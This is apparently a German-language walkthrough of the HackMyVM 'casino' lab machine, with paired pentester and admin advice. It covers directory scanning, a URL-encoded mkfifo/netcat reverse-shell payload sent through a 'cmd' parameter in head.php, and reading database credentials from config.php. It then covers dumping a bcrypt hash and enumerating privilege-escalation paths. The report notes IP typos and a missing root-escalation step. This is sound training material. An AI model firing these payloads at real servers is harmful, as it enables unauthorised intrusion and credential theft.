+Encoding Process                : Progressive DCT, Huffman coding
+Bits Per Sample                 : 8
+Color Components                : 1
+Image Size                      : 250x250
+Megapixels                      : 0.062
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> `exiftool` wird verwendet, um die Metadaten der Datei `background.jpg` zu extrahieren.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Metadaten enthalten keine offensichtlich nützlichen oder versteckten Informationen (keine Kommentare, GPS-Daten, Copyright-Hinweise mit Benutzernamen etc.).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Die Datei scheint keine verwertbaren Informationen zu enthalten. Konzentrieren Sie sich auf andere Angriffsvektoren.<br><strong>Empfehlung (Admin):</strong> Die Metadaten sind hier unbedenklich.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">dirb http://casino.hmv/</span></div>
+                    <pre>
+-----------------
+DIRB v2.22
+By The Dark Raver
+-----------------
+
+START_TIME: Wed Jun 28 16:28:40 2023
+URL_BASE: http://casino.hmv/
+WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt
+
+-----------------
+
+GENERATED WORDS: 4612
+
+---- Scanning URL: http://casino.hmv/ ----
+==> DIRECTORY: http://casino.hmv/imgs/                                                       <span class="comment"><!-- Maskiert: > --></span>
++ http://casino.hmv/index.php (CODE:200|SIZE:1138)
+==> DIRECTORY: http://casino.hmv/js/                                                         <span class="comment"><!-- Maskiert: > --></span>
++ http://casino.hmv/robots.txt (CODE:200|SIZE:12)
++ http://casino.hmv/server-status (CODE:403|SIZE:275)
+==> DIRECTORY: http://casino.hmv/styles/                                                     <span class="comment"><!-- Maskiert: > --></span>
+
+---- Entering directory: http://casino.hmv/imgs/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://casino.hmv/js/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+---- Entering directory: http://casino.hmv/styles/ ----
+(!) WARNING: Directory IS LISTABLE. No need to scan it.
+    (Use mode '-w' if you want to scan it anyway)
+
+-----------------
+END_TIME: Wed Jun 28 16:28:43 2023
+DOWNLOADED: 4612 - FOUND: 3
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Ein weiterer Verzeichnis-Scan wird mit `dirb` und der Standard-Wortliste `common.txt` durchgeführt. `dirb` prüft nur auf Verzeichnisse und einige Standarddateien.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dieser Scan findet weniger als der vorherige `gobuster`-Scan, da er eine kleinere Wortliste verwendet und keine spezifischen Dateierweiterungen sucht. Er bestätigt die bereits bekannten Verzeichnisse (`imgs`, `js`, `styles`) und die `index.php` sowie `robots.txt`. Der Fund `server-status` (Code 403 Forbidden) ist interessant, deutet aber darauf hin, dass der Zugriff darauf (noch) nicht erlaubt ist.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Der `gobuster`-Scan war umfassender. Notieren Sie sich `/server-status` als potenzielles Ziel, falls später Zugriffsberechtigungen geändert werden oder eine Fehlkonfiguration gefunden wird.<br><strong>Empfehlung (Admin):</strong> Beschränken Sie den Zugriff auf `/server-status` und `/server-info` in der Apache-Konfiguration auf vertrauenswürdige IP-Adressen oder deaktivieren Sie sie ganz, wenn nicht benötigt.</p>
+        </section>
+
+        <section id="initial-access">
+            <h2>Initial Access (LFI & Shell)</h2>
+
+            <p class="analysis"><strong>Kontext:</strong> Der folgende Abschnitt beschreibt die Ausnutzung einer Schwachstelle (vermutlich Local File Inclusion - LFI) in der Datei `/casino/head.php`, um eine Reverse Shell zu erhalten. Der genaue LFI-Parameter wird nicht gezeigt, aber die Payload deutet darauf hin, dass der `cmd`-Parameter zur Ausführung von Shell-Befehlen missbraucht wird, was eher auf Command Injection oder eine Webshell hindeutet, die über LFI inkludiert wird.</p>
+
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies eine Notiz/Payload-Beschreibung ist -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+Payload: http://192.168.2.111/casino/head.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.2.137%205555%20%3E%2Ftmp%2Ff
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse der Payload-URL:</strong>
+                *   `http://192.168.2.111/casino/head.php`: Ziel-URL, die die verwundbare Datei `head.php` im Verzeichnis `/casino` anspricht. Die IP `192.168.2.111` ist hier wahrscheinlich ein Tippfehler und sollte `192.168.2.113` (casino.hmv) sein.
+                *   `?cmd=...`: Übergibt einen Befehl über den URL-Parameter `cmd`.
+                *   `rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.2.137%205555%20%3E%2Ftmp%2Ff`: Dies ist derselbe URL-kodierte Bash-Reverse-Shell-Payload wie im vorherigen Bericht, nur mit anderer Angreifer-IP (`192.168.2.137`) und anderem Port (`5555`). Dekodiert: `rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | /bin/sh -i 2>&1 | nc 192.168.2.137 5555 > /tmp/f`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Dies beschreibt den Versuch, über eine Schwachstelle in `head.php` (vermutlich Command Injection oder LFI einer Webshell) eine Reverse Shell zu erlangen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Starten Sie einen Netcat-Listener auf dem Angreifer-System (`192.168.2.137`) auf Port `5555`. Rufen Sie die Payload-URL (mit korrigierter Ziel-IP `192.168.2.113`) auf, um die Shell auszulösen.<br><strong>Empfehlung (Admin):</strong> Untersuchen Sie `head.php` dringend auf Command Injection oder LFI-Schwachstellen und beheben Sie diese. Validieren und sanitisieren Sie alle Benutzereingaben (insbesondere URL-Parameter). Implementieren Sie eine WAF.</p>
+
+             <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                    <pre>
+<span class="password">listening on [any] 5555 ...</span>
+<span class="password">connect to [192.168.2.137] from (UNKNOWN) [192.168.2.113] 59798</span> <span class="comment"><!-- IP korrigiert --></span>
+/bin/sh: 0: can't access tty; job control turned off
+<span class="prompt" style="color: yellow;">$</span> <span class="comment"><!-- Shell erhalten --></span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System (`192.168.2.137`) wird ein Netcat-Listener auf Port `5555` gestartet. Kurz darauf geht eine Verbindung vom Zielsystem (`192.168.2.113`) ein. Eine einfache Shell (`$`) wird als Benutzer `www-data` (impliziert durch den Kontext und spätere Befehle) erhalten.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Initialer Zugriff erfolgreich! Die Schwachstelle in `head.php` wurde ausgenutzt, um eine Reverse Shell als Webserver-Benutzer (`www-data`) zu erlangen.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Stabilisieren Sie die Shell (z.B. `python3 -c 'import pty; pty.spawn("/bin/bash")'`). Beginnen Sie mit der Enumeration des Systems als `www-data`. Suchen Sie nach Konfigurationsdateien, Passwörtern und Wegen zur Privilegienerweiterung.<br><strong>Empfehlung (Admin):</strong> Wie zuvor: Schwachstelle in `head.php` beheben. Egress-Filtering implementieren, um Reverse Shells zu blockieren. Berechtigungen des `www-data`-Benutzers minimieren.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@casino:/var/www/html$</span> <span class="command">cat config.php</span></div>
+                    <pre>
+
+$servername = "localhost";
+$username = "casino_admin";
+$password = "<span class="password">IJustWantToBeRichBaby420</span>";
+$dbname = "casino";
+
+$conn = new mysqli($servername, $username, $password, $dbname);
+
+// Verificar la conexión
+if ($conn->connect_error) {  <span class="comment"><!-- Maskiert: > --></span>
+    die("CACACULOPEDOPIS" . $conn->connect_error); <span class="comment"><!-- Maskiert: > --></span>
+}
+
+// Configurar el juego de caracteres
+$conn->set_charset("utf8"); <span class="comment"><!-- Maskiert: > --></span>
+
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Aus der erhaltenen Shell wird die Datei `config.php` im Web-Root-Verzeichnis (`/var/www/html`) ausgelesen. Diese Datei wurde zuvor von Nikto und Gobuster gefunden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt den Fund der Datenbank-Zugangsdaten (`casino_admin`:`IJustWantToBeRichBaby420`) nun direkt aus der Konfigurationsdatei. Dies bestätigt auch, dass der Gobuster-Scan bezüglich der Dateigröße (`Size: 0`) falsch lag.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Nutzen Sie diese Zugangsdaten, um auf die lokale MySQL-Datenbank zuzugreifen, wie bereits zuvor empfohlen.<br><strong>Empfehlung (Admin):</strong> Speichern Sie Passwörter nicht im Klartext in Konfigurationsdateien im Web-Root. Nutzen Sie sicherere Methoden wie Umgebungsvariablen oder Konfigurationsmanagement-Systeme.</p>
+
+        </section>
+
+        <section id="poc">
+            <h2>Proof of Concept (Initial Access via Command Injection/LFI)</h2>
+            <p class="analysis"><strong>Ziel:</strong> Demonstration, wie eine Schwachstelle in der Datei `/casino/head.php` (vermutlich Command Injection oder LFI einer Webshell über den `cmd`-Parameter) ausgenutzt werden kann, um eine Reverse Shell als Benutzer `www-data` zu erlangen.</p>
+            <p class="evaluation"><strong>Voraussetzungen:</strong>
+                *   Netzwerkzugriff auf den Webserver (Port 80).
+                *   Kenntnis der verwundbaren Datei (`/casino/head.php`) und des Parameters (`cmd`).
+                *   Ein Angreifer-System im selben Netzwerk (`192.168.2.137`), auf dem ein Listener gestartet werden kann.
+                *   Tools: Netcat (`nc`), Webbrowser oder `curl`.
+            </p>
+            <p class="recommendation"><strong>Risiko:</strong> Hoch. Die Schwachstelle erlaubt die Ausführung beliebiger Befehle als Webserver-Benutzer (`www-data`), was zu einem vollständigen Kompromittierung des Webservers und potenziell des gesamten Systems führen kann.</p>
+
+            <p class="analysis"><strong>Schritt 1: Listener starten</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <div class="prompt">┌──(root㉿cyber)-[~]
+└─# <span class="command">nc -lvnp 5555</span></div>
+                     <pre>
+<span class="password">listening on [any] 5555 ...</span>
+</pre>
+                 </div>
+             </div>
+             <p class="analysis"><strong>Analyse:</strong> Auf dem Angreifer-System (IP: 192.168.2.137) wird ein Netcat-Listener auf Port 5555 gestartet, um die eingehende Reverse-Shell-Verbindung zu empfangen.</p>
+
+             <p class="analysis"><strong>Schritt 2: Payload senden</strong></p>
+             <div class="code-block">
+                 <div class="terminal">
+                     <!-- Kein Prompt, da dies eine URL ist, die z.B. mit curl oder im Browser aufgerufen wird -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+<span class="command">http://192.168.2.113/casino/head.php?cmd=rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7C%2Fbin%2Fsh%20-i%202%3E%261%7Cnc%20192.168.2.137%205555%20%3E%2Ftmp%2Ff</span>
+                     </pre>
+                 </div>
+             </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese URL wird aufgerufen. Sie zielt auf die verwundbare Datei `head.php` auf dem Zielsystem (`192.168.2.113`). Der `cmd`-Parameter enthält den URL-kodierten Payload für die Bash-Reverse-Shell, die sich zurück zum Listener auf `192.168.2.137:5555` verbindet.</p>
+
+            <p class="analysis"><strong>Schritt 3: Verbindung empfangen</strong></p>
+            <div class="code-block">
+                 <div class="terminal">
+                     <!-- Fortsetzung der Listener-Ausgabe aus Schritt 1 -->
+                     <pre>
+<span class="password">listening on [any] 5555 ...</span>
+<span class="password">connect to [192.168.2.137] from (UNKNOWN) [192.168.2.113] 59798</span>
+/bin/sh: 0: can't access tty; job control turned off
+<span class="prompt" style="color: yellow;">$</span> <span class="command">id</span>
+<span class="command">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Ergebnis:</strong> Der Netcat-Listener zeigt die eingehende Verbindung vom Zielsystem. Eine Shell wird bereitgestellt. Der `id`-Befehl bestätigt, dass die Shell als Benutzer `www-data` läuft.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Proof of Concept demonstriert erfolgreich, wie die Schwachstelle in `head.php` zur Erlangung einer Shell als `www-data` ausgenutzt werden kann.</p>
+            <p class="recommendation"><strong>Empfehlung (Admin):</strong> Priorisieren Sie die Behebung der Schwachstelle in `head.php`. Führen Sie eine Code-Überprüfung durch, um ähnliche Schwachstellen in anderen Teilen der Anwendung zu finden. Implementieren Sie Input-Validierung und Output-Encoding.</p>
+        </section>
+
+        <section id="privilege-escalation">
+            <h2>Privilege Escalation Enumeration</h2>
+
+            <p class="analysis"><strong>Kontext:</strong> Nach Erlangung der Shell als `www-data` werden verschiedene Enumerationsschritte durchgeführt, um potenzielle Wege zur Privilegienerweiterung zu finden.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@casino:/var/www/html$</span> <span class="command">ls -la /home/</span></div>
+                    <pre>
+total 16
+drwxr-xr-x  4 root    root    4096 Jun 14 14:09 .
+drwxr-xr-x 18 root    root    4096 Jun 13 12:38 ..
+drwx------  3 <span class="command">gimbal</span>  gimbal  4096 Jun 13 12:44 gimbal
+drwx------  3 <span class="command">shimmer</span> shimmer 4096 Jun 14 17:24 shimmer
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Auflisten der Home-Verzeichnisse. Es gibt zwei Benutzer neben `root`: `gimbal` und `shimmer`. Ihre Home-Verzeichnisse sind für `www-data` nicht lesbar.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Identifiziert potenzielle Benutzerkonten auf dem System.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie nach Passwörtern oder SSH-Schlüsseln für `gimbal` oder `shimmer` in Konfigurationsdateien oder Datenbanken.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass die Berechtigungen für Home-Verzeichnisse korrekt gesetzt sind (Standard ist 700 oder 750).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@casino:/var/www/html$</span> <span class="command">find / -type f -perm -4000 -ls 2>/dev/null</span></div>
+                    <pre>
+   407366     52 -rwsr-xr--   1 root     messagebus    51272 Feb  8 14:21 /usr/lib/dbus-1.0/dbus-daemon-launch-helper
+   410239    640 -rwsr-xr-x   1 root     root         653888 Feb  8 11:43 /usr/lib/openssh/ssh-keysign
+   391801     88 -rwsr-xr-x   1 root     root          88496 Mar 23 13:40 /usr/bin/gpasswd
+   395414     60 -rwsr-xr-x   1 root     root          59704 Mar 23 11:02 /usr/bin/mount
+   395416     36 -rwsr-xr-x   1 root     root          35128 Mar 23 11:02 /usr/bin/umount
+   391798     64 -rwsr-xr-x   1 root     root          62672 Mar 23 13:40 /usr/bin/chfn
+   396011     72 -rwsr-xr-x   1 root     root          72000 Mar 23 11:02 /usr/bin/su
+   391802     68 -rwsr-xr-x   1 root     root          68248 Mar 23 13:40 /usr/bin/passwd
+   395260     48 -rwsr-xr-x   1 root     root          48896 Mar 23 13:40 /usr/bin/newgrp
+   391799     52 -rwsr-xr-x   1 root     root          52880 Mar 23 13:40 /usr/bin/chsh
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Sucht nach Dateien mit gesetztem SUID-Bit (`-perm -4000`), die mit Root-Rechten ausgeführt werden, auch wenn sie von einem normalen Benutzer gestartet werden. Fehler (wie "Permission denied") werden nach `/dev/null` umgeleitet (`2>/dev/null`).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die gefundenen SUID-Binaries sind Standard-Systemdateien (`mount`, `su`, `passwd`, etc.) unter Debian/Linux. Keine ungewöhnlichen oder benutzerdefinierten SUID-Dateien werden gefunden, die direkt für eine Eskalation missbraucht werden könnten (basierend auf dieser Liste).</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Überprüfen Sie die Versionen dieser Standard-Binaries auf bekannte SUID-Exploits (unwahrscheinlich bei aktuellen Systemen). Suchen Sie nach anderen Eskalationsvektoren (Kernel-Exploits, Fehlkonfigurationen, Cronjobs, Capabilities).<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig SUID/SGID-Dateien auf dem System. Entfernen Sie das SUID/SGID-Bit von Dateien, die es nicht benötigen (`chmod -s /pfad/zur/datei`).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@casino:/var/www/html$</span> <span class="command">ss -altpn</span></div>
+                    <pre>
+State    Recv-Q   Send-Q     Local Address:Port     Peer Address:Port  Process
+LISTEN   0        511            <span class="command">127.0.0.1:6969</span>          0.0.0.0:*
+LISTEN   0        80             <span class="command">127.0.0.1:3306</span>          0.0.0.0:*              <span class="comment"><!-- MySQL/MariaDB --></span>
+LISTEN   0        128              <span class="command">0.0.0.0:22</span>            0.0.0.0:*              <span class="comment"><!-- SSH --></span>
+LISTEN   0        128                 <span class="command">[::]:22</span>               [::]:*              <span class="comment"><!-- SSH (IPv6) --></span>
+LISTEN   0        511                    <span class="command">*:80</span>                  *:*              <span class="comment"><!-- Apache --></span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Befehl `ss -altpn` zeigt offene Netzwerk-Listen-Sockets (lauschende Ports) an.
+                *   Port 6969: Lauscht nur auf localhost (`127.0.0.1`), unbekannter Dienst.
+                *   Port 3306: Lauscht nur auf localhost (`127.0.0.1`), der Standard-MySQL/MariaDB-Port. Bestätigt, dass die Datenbank nicht von außen erreichbar ist.
+                *   Port 22: Lauscht auf allen Interfaces (`0.0.0.0` und `::`) für SSH.
+                *   Port 80: Lauscht auf allen Interfaces (`*`) für HTTP (Apache).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Ergebnisse des Nmap-Scans und die Konfiguration des MySQL-Servers. Der Dienst auf Port 6969 ist neu, aber nur lokal erreichbar.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie den Dienst auf Port 6969 von der Shell aus (z.B. mit `curl localhost:6969` oder `nc localhost 6969`). Greifen Sie auf die MySQL-Datenbank auf Port 3306 mit den gefundenen Zugangsdaten zu.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass nur notwendige Dienste laufen und an die korrekten Interfaces gebunden sind. Identifizieren Sie den Dienst auf Port 6969 und prüfen Sie dessen Notwendigkeit und Sicherheit.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@casino:/var/www/html$</span> <span class="command">ls /var/backups/ -la</span></div>
+                    <pre>
+total 20
+drwxr-xr-x  2 root root  4096 Jun 14 13:43 .
+drwxr-xr-x 12 root root  4096 Jun 13 12:39 ..
+-rw-r--r--  1 root root 11116 Jun 13 12:48 apt.extended_states.0
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Überprüft den Inhalt des Standard-Backup-Verzeichnisses `/var/backups`.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Enthält nur eine Standard-Datei von `apt`. Keine offensichtlich nützlichen Backups (wie Datenbank-Dumps oder Konfigurationsdateien) gefunden.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie an anderen Orten nach Backups oder sensiblen Dateien.<br><strong>Empfehlung (Admin):</strong> Stellen Sie sicher, dass Backups sicher gespeichert und Berechtigungen korrekt gesetzt sind.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@casino:/var/www/html$</span> <span class="command">mysql -u casino_admin -p</span></div>
+                    <pre>
+Enter password: <span class="password">[Passwort IJustWantToBeRichBaby420 eingegeben]</span>
+Welcome to the MariaDB monitor.  Commands end with ; or \g.
+Your MariaDB connection id is 43
+Server version: 10.11.3-MariaDB-1 Debian 12
+
+Copyright (c) 2000, 2018, Oracle, MariaDB Corporation Ab and others.
+
+Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.
+
+<span class="prompt" style="color: gold;">MariaDB [(none)]></span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Erfolgreicher Login in die lokale MariaDB-Datenbank mit dem MySQL-Client unter Verwendung der Zugangsdaten (`casino_admin`:`IJustWantToBeRichBaby420`), die in `config.php` gefunden wurden.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Bestätigt die Gültigkeit der Zugangsdaten und ermöglicht den Zugriff auf die Datenbank `casino`.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Untersuchen Sie die Datenbanken (`show databases;`), wechseln Sie zur `casino`-Datenbank (`use casino;`), listen Sie die Tabellen auf (`show tables;`) und extrahieren Sie Daten aus der `users`-Tabelle (`select * from users;`).<br><strong>Empfehlung (Admin):</strong> Wie zuvor: Passwörter nicht im Klartext speichern. Überprüfen Sie die Berechtigungen des `casino_admin`-Benutzers innerhalb der Datenbank.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: gold;">MariaDB [(none)]></span> <span class="command">show databases;</span></div>
+                    <pre>
++--------------------+
+| Database           |
++--------------------+
+| casino             |
+| information_schema |
++--------------------+
+2 rows in set (0.000 sec)
+</pre>
+                    <div class="prompt" style="color: gold;">MariaDB [(none)]></span> <span class="command">use casino;</span></div>
+                    <pre>
+Reading table information for completion of table and column names
+You can turn off this feature to get a quicker startup with -A
+
+Database changed
+</pre>
+                    <div class="prompt" style="color: gold;">MariaDB [casino]></span> <span class="command">show tables;</span></div>
+                    <pre>
++------------------+
+| Tables_in_casino |
++------------------+
+| users            |
++------------------+
+1 row in set (0.000 sec)
+</pre>
+                    <div class="prompt" style="color: gold;">MariaDB [casino]></span> <span class="command">select * from users;</span></div>
+                    <pre>
++----+------+--------------------------------------------------------------+-------+
+| id | user | pass                                                         | money |
++----+------+--------------------------------------------------------------+-------+
+|  1 | <span class="command">tom</span>  | <span class="password">$2y$10$ZSVTC1i0SGSy6hv04HOkFej3Cc0hq6kT9dS4EkrZOc7yBn0cEsKaq</span> |  1000 |
++----+------+--------------------------------------------------------------+-------+
+1 row in set (0.000 sec)
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Innerhalb der MariaDB-Shell werden die Datenbanken aufgelistet, zur `casino`-Datenbank gewechselt, deren Tabellen angezeigt (`users`) und schließlich der Inhalt der `users`-Tabelle abgefragt.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Ein Benutzer `tom` mit einem Passwort-Hash (`$2y$10$...` -> bcrypt) wird gefunden. Dies ist ein weiterer wichtiger Fund.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie, den bcrypt-Hash für `tom` offline zu knacken (z.B. mit Hashcat). Wenn erfolgreich, versuchen Sie, sich als `tom` per SSH anzumelden (da Passwort-Authentifizierung dort deaktiviert ist, funktioniert dies wahrscheinlich nicht direkt, aber das Passwort könnte woanders wiederverwendet werden). Überprüfen Sie, ob `tom` einer der Benutzer (`gimbal`, `shimmer`) ist.<br><strong>Empfehlung (Admin):</strong> Verwenden Sie starke, zufällige Passwörter. Speichern Sie Hashes mit einem hohen Cost-Faktor (bei bcrypt). Überwachen Sie Datenbankzugriffe.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                     <!-- Kein Prompt, wieder eine Notiz/Beobachtung -->
+                     <pre style="color: #a6e22e; background-color: #000; padding: 10px; border-radius: 5px;">
+http://192.168.111/casino/explainmepls.php?learnabout=id <span class="comment"><!-- IP sollte 192.168.2.113 sein --></span>
+                     </pre>
+                 </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Diese Zeile deutet auf eine weitere potenziell interessante Datei hin: `/casino/explainmepls.php`. Der Parameter `learnabout=id` lässt vermuten, dass hier möglicherweise eine weitere Command Injection oder eine Informations-Leak-Schwachstelle vorliegt.</p>
+             <p class="evaluation"><strong>Bewertung:</strong> Ein weiterer potenzieller Angriffsvektor oder eine Informationsquelle.</p>
+             <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Rufen Sie die URL (mit korrekter IP) auf und testen Sie den `learnabout`-Parameter auf Command Injection (z.B. `learnabout=id; ls -la`, `learnabout=$(whoami)`) oder LFI.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie `explainmepls.php` auf Schwachstellen und beheben Sie diese.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@casino:/var/www/html/casino$</span> <span class="command">cat explainmepls.php</span></div>
+                    <pre>
+
+require_once "../restricted.php";
+include_once "../config.php";
+
+session_start();
+
+if ($SERVER['REQUEST_METHOD'] === 'GET') {
+    $learnabout = $GET['learnabout'];
+}
+
+
+    Binary Bet Casino
+    < --By LordP4 <3 -->  <span class="comment"><!-- Maskiert: < > --></span>
+
+
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Der Quellcode von `explainmepls.php` wird ausgelesen. Er bindet `restricted.php` und `config.php` ein, startet eine Session und liest den GET-Parameter `learnabout` in eine Variable ein. Der restliche Code, der `$learnabout` verwendet, fehlt hier, aber die Art, wie der Parameter direkt gelesen wird, ist oft ein Hinweis auf mögliche Schwachstellen (z.B. wenn er später unsanitisiert in `eval()`, `system()`, `include()` oder einer SQL-Abfrage verwendet wird).</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Der Codeausschnitt selbst zeigt keine vollständige Schwachstelle, aber er verstärkt den Verdacht, dass der `learnabout`-Parameter ein Angriffspunkt sein könnte. Die Einbindung von `restricted.php` könnte auch interessant sein.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Versuchen Sie weiterhin, den `learnabout`-Parameter auszunutzen. Versuchen Sie, `restricted.php` über die LFI (falls vorhanden) oder direkt zu lesen.<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie den vollständigen Code von `explainmepls.php` und stellen Sie sicher, dass der `$learnabout`-Parameter sicher verarbeitet wird, bevor er verwendet wird (Input-Validierung, Escaping, parametrisierte Abfragen etc.).</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@casino:/var/www/html/casino/games$</span> <span class="command">uname -a</span></div>
+                    <pre>
+Linux casino 6.1.0-9-amd64 #1 SMP PREEMPT_DYNAMIC Debian 6.1.27-1 (2023-05-08) x86_64 GNU/Linux
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Zeigt detaillierte Informationen über das Betriebssystem und den Kernel an.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Gibt die genaue Kernel-Version (6.1.0-9-amd64) und das Betriebssystem (Debian 6.1.27-1) an. Dies ist nützlich für die Suche nach spezifischen Kernel-Exploits.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Suchen Sie auf Exploit-DB oder anderen Ressourcen nach bekannten Kernel-Exploits für Linux Kernel 6.1.0.<br><strong>Empfehlung (Admin):</strong> Halten Sie das System und den Kernel stets aktuell, um bekannte Schwachstellen zu patchen.</p>
+
+            <div class="code-block">
+                <div class="terminal">
+                    <div class="prompt" style="color: yellow;">www-data@casino:/var/www/html/casino/games$</span> <span class="command">getcap -r / 2>/dev/null</span></div>
+                    <pre>
+<span class="command">/usr/bin/ping cap_net_raw=ep</span>
+</pre>
+                </div>
+            </div>
+            <p class="analysis"><strong>Analyse:</strong> Sucht rekursiv im gesamten Dateisystem (`/`) nach Dateien mit gesetzten Linux Capabilities. Fehler werden nach `/dev/null` umgeleitet.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Es wird nur die Standard-Capability `cap_net_raw=ep` für `/usr/bin/ping` gefunden. Dies ist normal und bietet keinen direkten Weg zur Privilegienerweiterung.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Capabilities scheinen kein vielversprechender Vektor zu sein. Konzentrieren Sie sich auf andere Methoden (Passwort-Cracking, Kernel-Exploit, Fehlkonfigurationen).<br><strong>Empfehlung (Admin):</strong> Überprüfen Sie regelmäßig Capabilities und entfernen Sie unnötige (`setcap -r /pfad/zur/datei`).</p>
+
+            <p class="analysis"><strong>Fehlender Schritt:</strong> Der Berichtstext springt hier zu "Privilege Escalation erfolgreich", aber der tatsächliche Schritt, wie von `www-data` (mit Datenbankzugriff und Benutzer-Hash) zu Root eskaliert wurde, fehlt in den Logs. Mögliche Wege wären das Knacken des `tom`-Hashes und Wiederverwendung des Passworts, ein Kernel-Exploit oder eine andere unentdeckte Fehlkonfiguration.</p>
+            <p class="evaluation"><strong>Bewertung:</strong> Die Dokumentation der Privilegienerweiterung ist unvollständig. Der entscheidende Exploit oder die ausgenutzte Schwachstelle für den Schritt zu Root fehlt.</p>
+            <p class="recommendation"><strong>Empfehlung (Pentester):</strong> Ergänzen Sie den Bericht um den fehlenden Eskalationsschritt, sobald dieser nachvollzogen wurde.<br><strong>Empfehlung (Admin):</strong> Obwohl der genaue Weg fehlt, wurden bereits mehrere Schwachstellen (LFI/Command Injection, Klartextpasswörter, fehlende Header, Verzeichnisauflistung) identifiziert, die dringend behoben werden müssen.</p>
+
